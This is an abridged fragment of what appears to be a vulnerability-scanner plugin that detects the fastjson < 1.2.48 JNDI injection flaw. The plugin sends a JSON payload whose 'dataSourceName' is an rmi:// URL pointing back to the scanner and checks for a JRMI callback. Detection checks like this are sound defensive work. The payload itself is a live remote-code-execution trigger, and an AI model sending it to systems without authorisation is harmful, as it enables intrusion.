...
if (description)
{
  script_id(51799248);
  script_version("1.3");
  script_name(english:"fastjson < 1.2.48 JNDI inject");
  script_summary(english:"fastjson < 1.2.48 JNDI inject");
  script_set_attribute(attribute:"description", value:"fastjson < 1.2.48 JNDI inject.");
...
function check_local_ping(port){
    ...
    "b":{
        ...
        "dataSourceName":"rmi://'+ laddress +':'+ bind_port +'/Exploit",
        "autoCommit":true
    }
}';
    ...
    if ("JRMI" >< curl_response && "K" >< curl_response){
	    return {'vuln':true, 'report':"fastjson< 1.2.48 JNDI RCE"};
	} 
